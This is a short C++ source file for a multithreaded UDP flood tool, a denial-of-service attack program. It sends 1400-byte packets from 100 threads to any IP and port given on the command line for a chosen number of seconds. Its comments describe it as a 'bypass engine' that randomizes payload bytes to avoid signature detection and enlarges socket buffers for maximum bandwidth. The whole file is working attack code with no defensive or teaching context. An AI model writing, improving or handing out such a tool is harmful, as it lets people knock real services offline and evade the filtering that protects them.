#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <cstring>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <random>

// 2026 Updated: Packet Crafting & Bypass Engine
void send_extreme_traffic(const char* ip, int port, int duration) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;

    // Buffer size increase for maximum bandwidth
    int sndbuf = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(ip);

    // 2026 Bypass: Dynamic Payload
    char message[1400]; // Standard MTU size
    std::mt19937 rng(std::chrono::steady_clock::now().time_since_epoch().count());
    std::uniform_int_distribution<int> dist(0, 255);

    auto start_time = std::chrono::steady_clock::now();
    while (std::chrono::steady_clock::now() - start_time < std::chrono::seconds(duration)) {
        // Randomize some bytes to avoid signature detection
        for(int i=0; i<10; i++) message[rng() % 1400] = dist(rng);
        
        sendto(sock, message, sizeof(message), 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
    }
    close(sock);
}

int main(int argc, char* argv[]) {
    if (argc != 4) return 1;

    const char* ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);

    // 100 Threads per Server! 
    std::vector<std::thread> threads;
    for (int i = 0; i < 100; ++i) {
        threads.push_back(std::thread(send_extreme_traffic, ip, port, duration));
    }

    for (auto& t : threads) t.join();
    return 0;
}
